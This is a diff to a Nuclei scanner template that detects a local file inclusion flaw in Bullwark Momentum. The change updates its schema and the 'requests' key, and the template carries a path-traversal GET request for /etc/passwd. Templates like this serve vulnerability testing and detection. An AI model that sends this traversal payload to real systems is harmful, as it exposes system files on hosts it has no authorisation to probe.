@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: bullwark-momentum-lfi
 
 info:
@@ -14,7 +15,7 @@ info:
     fofa-query: https://fofa.so/result?q=Bullwark&qbase64=QnVsbHdhcms%3D
   tags: bullwark,lfi
 
-requests:
+http:
   - raw:
       - |
         GET /../../../../../../../../../../../../../etc/passwd HTTP/1.1
